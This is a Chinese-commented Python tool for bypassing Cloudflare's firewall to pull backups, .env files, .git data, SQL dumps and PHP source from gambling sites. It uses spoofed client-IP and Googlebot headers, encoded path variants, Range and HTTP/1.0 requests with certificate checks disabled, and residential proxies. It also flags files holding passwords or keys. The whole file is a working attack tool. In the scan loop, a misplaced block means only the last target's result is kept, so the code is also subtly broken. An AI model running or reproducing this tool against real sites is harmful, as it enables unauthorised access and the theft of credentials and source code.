#!/usr/bin/env python3
"""CF WAF 绕过 — 敏感备份文件拉取（博彩站专项）。

博彩站的 .bak / .swp / .git / .env 文件往往存在但被 CF WAF 拦截（403/520）。
本工具用多种 WAF 绕过手法尝试直接拉取：
  1. 路径级编码变形（大小写/双编码/分块）
  2. HTTP 头混淆（Accept-Language/X-Forwarded-For/X-Real-IP）
  3. 住宅代理直打源站（已配置 config/residential_proxies.txt）
  4. 范围请求（Range: bytes=0-1000）— CF 不缓存/不检测 Range 的 body
  5. 协议降级（HTTP/1.0）
  6. 参数混淆（?v=1 等无害查询串）

示例:
  python3 炼蛊房/cf_backup_bypass.py doctor
  python3 炼蛊房/cf_backup_bypass.py scan \
    --base https://target.com --case <案卷>
  python3 炼蛊房/cf_backup_bypass.py fetch \
    --url https://target.com/index.php.bak --case <案卷>
"""
from __future__ import annotations
import argparse
import json
import random
import string
import sys
import time
import urllib.parse
from datetime import datetime, UTC
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS    = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "backup_files"
    d.mkdir(parents=True, exist_ok=True)
    return d

# ────── 目标文件路径字典 ──────
BACKUP_TARGETS = [
    # PHP 源码泄露
    "index.php.bak", "index.php~", "index.php.swp", "index.php.swo",
    "config.php.bak", "config.php~",
    "database.php.bak", "db.php.bak",
    "admin.php.bak", "login.php.bak",
    "api.php.bak", "app.php.bak",
    # .env / 配置
    ".env", ".env.bak", ".env.local", ".env.production",
    ".env.example", "env.php",
    # Git 泄露
    ".git/config", ".git/HEAD", ".git/index",
    ".git/COMMIT_EDITMSG",
    ".git/logs/HEAD",
    ".git/refs/heads/master",
    ".git/refs/heads/main",
    # 打包文件
    "www.zip", "wwwroot.zip", "web.zip", "backup.zip",
    "site.zip", "source.zip", "code.zip",
    "www.tar.gz", "wwwroot.tar.gz", "backup.tar.gz",
    "upload.zip", "public.zip",
    # 常见数据库备份
    "db.sql", "database.sql", "backup.sql",
    "dump.sql", "export.sql",
    # 博彩站常见
    "h5.zip", "app.zip", "admin.zip", "mobile.zip",
    "wap.zip", "api.zip", "game.zip",
    # Composer/package
    "composer.json", "composer.lock", "package.json",
    # 日志
    "error.log", "access.log", "app.log",
    # 其他
    "phpinfo.php", "info.php", "test.php",
    "robots.txt", "crossdomain.xml", "sitemap.xml",
    "web.config", "WEB-INF/web.xml",
]

# ────── WAF 绕过策略 ──────
def _rand_str(n=6): return ''.join(random.choices(string.ascii_lowercase, k=n))
def _double_encode(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')
def _mixed_case(s: str) -> str:
    return ''.join(c.upper() if i % 2 else c for i, c in enumerate(s))
def _path_variants(path: str) -> list[str]:
    """生成各种路径变体，绕过规则匹配。"""
    variants = [path]
    # 添加无害查询串
    for v in [f"{path}?v=1", f"{path}?t={_rand_str()}", f"{path}?_={_rand_str()}"]:
        variants.append(v)
    # URL 编码后缀里的点
    ext_encoded = path.replace(".", "%2E")
    variants.append(ext_encoded)
    # 双编码
    variants.append(_double_encode(path))
    # 路径遍历变体（针对 .bak 类）
    if "/" not in path:
        variants.append(f"./{path}")
        variants.append(f"../{path.split('/')[-1]}")
    return variants

def _bypass_headers(origin_ip: str = "") -> list[dict]:
    """返回多组 CF 绕过 Header 集合。"""
    sets = [
        # 基础：无特殊头
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"},
        # 伪造本地源
        {"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "127.0.0.1",
         "X-Real-IP": "127.0.0.1", "X-Originating-IP": "127.0.0.1"},
        # Cloudflare 内部绕过头（部分版本有效）
        {"User-Agent": "Mozilla/5.0", "CF-Connecting-IP": "127.0.0.1",
         "True-Client-IP": "127.0.0.1"},
        # 伪造 CDN 缓存命中
        {"User-Agent": "Mozilla/5.0", "X-Forwarded-Host": "origin",
         "X-Cache": "HIT", "Age": "1"},
        # 爬虫 UA（某些 WAF 放宽对爬虫的限制）
        {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
        {"User-Agent": "curl/7.87.0"},
        # Accept 变体（规避内容类型检测）
        {"User-Agent": "Mozilla/5.0",
         "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
         "Accept-Language": "zh-CN,zh;q=0.9"},
    ]
    if origin_ip:
        sets.append({"User-Agent": "Mozilla/5.0",
                     "Host": origin_ip, "X-Forwarded-For": "8.8.8.8"})
    return sets

def _range_request(sess, url: str, timeout: float) -> bytes | None:
    """Range 请求绕过（CF 有时不检查 Range body）。"""
    try:
        r = sess.get(url, headers={"Range": "bytes=0-65535"}, timeout=timeout)
        if r.status_code in (200, 206) and len(r.content) > 50:
            return r.content
    except Exception:
        pass
    return None

def _http10_request(url: str, timeout: float = 10.0) -> bytes | None:
    """HTTP/1.0 请求（跳过 CF 的 HTTP/1.1 规则）。"""
    import socket
    import ssl
    try:
        from urllib.parse import urlparse
        p = urlparse(url)
        host = p.netloc.split(":")[0]
        port = int(p.netloc.split(":")[1]) if ":" in p.netloc else (443 if p.scheme == "https" else 80)
        path = p.path or "/"
        sock = socket.create_connection((host, port), timeout=timeout)
        if p.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        req = (f"GET {path} HTTP/1.0\r\n"
               f"Host: {host}\r\n"
               f"Connection: close\r\n\r\n")
        sock.sendall(req.encode())
        resp = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk: break
            resp += chunk
        sock.close()
        # 解析 body
        if b"\r\n\r\n" in resp:
            return resp.split(b"\r\n\r\n", 1)[1]
    except Exception:
        pass
    return None

def try_fetch(sess, url: str, timeout: float = 12.0, proxies: list[str] | None = None) -> tuple[int, bytes]:
    """多策略尝试获取 URL 内容，返回 (策略数量, 最终内容)。"""
    strategies_tried = 0
    best_content = b""
    best_status = -1

    # 策略 1：普通请求 + 各种 header
    for headers in _bypass_headers():
        strategies_tried += 1
        old_headers = dict(sess.headers)
        try:
            sess.headers.update(headers)
            r = sess.get(url, timeout=timeout)
            if r.status_code == 200 and len(r.content) > 100:
                return strategies_tried, r.content
            if r.status_code not in (403, 520, 521, 522, 525) and len(r.content) > len(best_content):
                best_content = r.content
                best_status = r.status_code
        except Exception:
            pass
        finally:
            sess.headers.clear()
            sess.headers.update(old_headers)
        time.sleep(0.3)

    # 策略 2：Range 请求
    strategies_tried += 1
    content = _range_request(sess, url, timeout)
    if content and len(content) > 100:
        return strategies_tried, content

    # 策略 3：HTTP/1.0
    strategies_tried += 1
    content = _http10_request(url, timeout)
    if content and len(content) > 100:
        return strategies_tried, content

    # 策略 4：路径变体
    base, path_q = url.rsplit("/", 1) if "/" in url else (url, "")
    for variant in _path_variants(path_q)[1:]:
        strategies_tried += 1
        try:
            r = sess.get(f"{base}/{variant}", timeout=timeout)
            if r.status_code == 200 and len(r.content) > 100:
                return strategies_tried, r.content
        except Exception:
            pass

    # 策略 5：住宅代理
    if proxies:
        for proxy in proxies[:5]:
            strategies_tried += 1
            try:
                r = requests.get(url, proxies={"http": proxy, "https": proxy},
                                 verify=False, timeout=timeout)
                if r.status_code == 200 and len(r.content) > 100:
                    return strategies_tried, r.content
            except Exception:
                pass

    return strategies_tried, best_content

def _looks_like_source_code(content: bytes) -> bool:
    text = content[:2000]
    try:
        t = text.decode("utf-8", errors="ignore").lower()
    except Exception:
        return False
    markers = ["<?php", "<?=", "function ", "class ", "require", "import ",
               "define(", "namespace ", "use ", "return ", "password", "database",
               "api_key", "secret", "token", "db_host", "[db]", "dsn="]
    return sum(1 for m in markers if m in t) >= 2

def cmd_doctor(_: argparse.Namespace) -> int:
    print(f"[{'ok' if HAS_REQUESTS else 'missing'}] requests")
    print(f"[ok] {len(BACKUP_TARGETS)} backup file targets in dictionary")
    rp = ENGINE / "config" / "residential_proxies.txt"
    count = len([l for l in rp.read_text(encoding="utf-8").splitlines()
                 if l.strip() and not l.startswith("#")]) if rp.is_file() else 0
    print(f"[ok] residential proxies: {count}")
    print("[ok] cf_backup_bypass ready")
    return 0

def cmd_scan(args: argparse.Namespace) -> int:
    base = args.base.rstrip("/")
    domain = host_of(base)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    # 加载住宅代理
    proxies: list[str] = []
    rp = ENGINE / "config" / "residential_proxies.txt"
    if rp.is_file():
        proxies = [l.strip() for l in rp.read_text(encoding="utf-8").splitlines()
                   if l.strip() and not l.startswith("#")]

    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"

    print(f"[*] scanning {len(BACKUP_TARGETS)} backup targets on {base}")
    print(f"[*] residential proxies available: {len(proxies)}")

    hits = []
    for target in BACKUP_TARGETS:
        url = f"{base}/{target}"
        n_strat, content = try_fetch(sess, url, args.timeout, proxies if args.use_proxy else [])
    if content and len(content) > 100:
            is_src = _looks_like_source_code(content)
            tag = "★SRC" if is_src else "★binary" if content[:4] in (b"PK\x03\x04",) else "★found"
            print(f"  {tag} [{len(content)}B] {target}  (strategies={n_strat})")
            out_file = case_dir(args.case) / target.replace("/", "__")
            out_file.write_bytes(content)
            hits.append({"url": url, "size": len(content), "is_source": is_src,
                          "saved": str(out_file)})
            if is_src:
                preview = content[:500].decode("utf-8", errors="ignore")
                print(f"    preview: {preview[:200]!r}")

    out_json = case_dir(args.case) / "scan_result.json"
    out_json.write_text(json.dumps({"ts": _now(), "base": base, "hits": hits},
                                   ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] {len(hits)} files fetched → {case_dir(args.case)}")
    if hits:
        src_hits = [h for h in hits if h["is_source"]]
        if src_hits:
            print(f"\n★★★ {len(src_hits)} 个 PHP 源码文件获取！")
            print("[next] python3 tools/deepaudit/bin/da_pipeline.py --target " +
                  case_dir(args.case).as_posix() + " --pay-hint")
    return 0 if hits else 1

def cmd_fetch(args: argparse.Namespace) -> int:
    """单文件抓取，全策略轮转。"""
    domain = host_of(args.url)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")
    proxies: list[str] = []
    rp = ENGINE / "config" / "residential_proxies.txt"
    if rp.is_file():
        proxies = [l.strip() for l in rp.read_text(encoding="utf-8").splitlines()
                   if l.strip() and not l.startswith("#")]
    sess = requests.Session()
    sess.verify = False
    n, content = try_fetch(sess, args.url, 15.0, proxies)
    if content:
        fname = args.url.split("/")[-1] or "file.bin"
        out = case_dir(args.case) / fname if args.case else Path(fname)
        out.write_bytes(content)
        print(f"[+] {len(content)}B saved → {out}")
        print(f"    source_code={_looks_like_source_code(content)}")
        if _looks_like_source_code(content):
            print(content[:400].decode("utf-8", errors="ignore"))
        return 0
    else:
        print(f"[-] all {n} strategies failed")
        return 1

def main() -> int:
    p = argparse.ArgumentParser(description="CF WAF 绕过拿备份文件")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor"); d.set_defaults(func=cmd_doctor)

    sc = sub.add_parser("scan", help="批量扫描备份文件")
    sc.add_argument("--base", required=True)
    sc.add_argument("--case", required=True)
    sc.add_argument("--timeout", type=float, default=12.0)
    sc.add_argument("--use-proxy", action="store_true", default=True)
    sc.set_defaults(func=cmd_scan)

    ft = sub.add_parser("fetch", help="单文件全策略拉取")
    ft.add_argument("--url", required=True)
    ft.add_argument("--case", default="")
    ft.add_argument("--timeout", type=float, default=15.0)
    ft.set_defaults(func=cmd_fetch)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
